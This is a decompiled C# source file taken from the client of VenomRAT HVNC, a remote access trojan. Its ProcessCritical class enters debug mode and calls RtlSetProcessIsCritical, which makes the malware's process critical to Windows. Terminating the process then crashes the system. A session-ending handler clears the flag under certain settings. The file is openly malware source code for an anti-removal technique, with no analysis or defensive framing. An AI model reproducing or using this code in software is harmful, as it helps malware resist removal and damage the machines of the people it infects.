// Decompiled with JetBrains decompiler
// Type: Client.Helper.ProcessCritical
// Assembly: Client, Version=5.0.0.3, Culture=neutral, PublicKeyToken=null
// MVID: AF1838BC-6B25-40E4-9339-7F493AC3654D
// Assembly location: C:\Users\Younn\RiderProjects\VenomRAT_HVNC-5.0.4.0\VenomRAT_HVNC\bin\Debug\Client.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Threading;


namespace Client.Helper
{
  public static class ProcessCritical
  {
    public static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
    {
      if (!Convert.ToBoolean(Settings.BS_OD) || !Methods.IsAdmin())
        return;
      ProcessCritical.Exit();
    }

    public static void Set()
    {
      try
      {
        SystemEvents.SessionEnding += new SessionEndingEventHandler(ProcessCritical.SystemEvents_SessionEnding);
        Process.EnterDebugMode();
        NativeMethods.RtlSetProcessIsCritical(1U, 0U, 0U);
      }
      catch
      {
      }
    }

    public static void Exit()
    {
      try
      {
        NativeMethods.RtlSetProcessIsCritical(0U, 0U, 0U);
      }
      catch
      {
        while (true)
          Thread.Sleep(100000);
      }
    }
  }
}
